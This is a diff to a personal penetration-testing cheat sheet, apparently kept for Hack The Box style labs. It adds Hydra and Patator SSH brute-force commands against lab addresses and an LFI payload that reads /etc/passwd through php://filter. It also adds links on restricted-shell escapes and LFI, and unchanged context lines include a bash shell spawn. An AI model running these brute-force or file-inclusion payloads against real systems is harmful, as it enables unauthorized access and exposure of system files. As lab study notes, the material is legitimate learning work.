@@ -39,6 +39,15 @@ echo os.system('/bin/bash')
 ### THC Hydra
 ```bash
 hydra -l admin -P /usr/share/wordlist/rockyou.txt docker.hackthebox.eu http-post-form "/:password=^PASS^:Invalid password!" -s 35644
+
+# ssh brute force
+hydra -l sunny -p sunday ssh://192.168.172.3:22
+```
+### Patator
+https://www.ihacklabs.com/en/brute-force-with-patator/
+
+```bash
+patator.py ssh_login host=10.0.0.1 user=FILE0 password=FILE1 0=users.txt 1=passwords.txt -x ignore:mesg=’Authentication failed.’
 ```
 ## Privilege Escalation Techniques
 [Basic Linux Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
@@ -115,3 +124,24 @@ $ sudo chmod u-s /usr/bin/whoami # Unset SUID
 ### Port and Host IP Scanning without NMap/Permissions
 [No Nmap, No Permissions, No Problem](https://www.lanmaster53.com/2010/04/16/no-nmap-no-permissions-no-problem/)
 ## *Nix Commands
+### tr
+> tr is an UNIX utility for translating, or deleting, or squeezing repeated characters. It will read from STDIN and write to STDOUT.
+
+https://www.thegeekstuff.com/2012/12/linux-tr-command/
+
+## Escaping restricted shell
+https://speakerdeck.com/knaps/escape-from-shellcatraz-breaking-out-of-restricted-unix-shells?slide=2
+
+## Well known vulnerabilities
+### shell shock
+
+### LFI
+
+https://medium.com/@Aptive/local-file-inclusion-lfi-web-application-penetration-testing-cc9dc8dd3601
+
+https://highon.coffee/blog/lfi-cheat-sheet/
+
+vuln.php?page=php://filter/convert.base64-encode/resource=/etc/passwd
+
+
+
